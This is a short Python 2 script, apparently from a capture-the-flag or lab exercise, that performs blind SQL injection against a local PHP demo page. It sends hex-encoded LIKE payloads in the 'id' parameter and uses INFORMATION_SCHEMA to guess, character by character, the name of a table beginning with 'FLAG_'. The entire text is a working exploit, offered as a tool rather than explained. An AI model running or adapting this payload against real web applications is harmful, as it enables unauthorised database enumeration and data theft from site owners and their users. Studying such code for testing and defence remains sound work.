import requests	
import string

def get_query_result(base_url,payload,success_text):
	pagecontent = requests.get(base_url, params=payload)
	if pagecontent.text.find(success_text) > 0:
		return True
	else:
		return False

BASE_URL = "http://localhost/demo/index.php"
SUCCESS_TEXT = "Minimal User Profile Layout"

table_name="FLAG_"
brute = True
guess = False

print "[+] Blind SQL Injection Exploit Using LIKE Technic "
while brute:
	for str in range(48,255):
		guess_table_name = table_name + chr(str) + "%"
		#print guess_table_name
		#exit()
		#guess_table_name = guess_table_name.encode("hex") 
		PAYLOAD = {'id': "(null)OR(SELECT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_NAME)LIKE(0x"+guess_table_name.encode("hex")+"))LIKE(0x"+guess_table_name.encode("hex")+")"}
		#print PAYLOAD
		guess = get_query_result(BASE_URL,PAYLOAD,SUCCESS_TEXT)
		if guess:
			print "[+] New Guessed Char : "+chr(str)
			table_name = table_name + chr(str)
			print table_name
			break
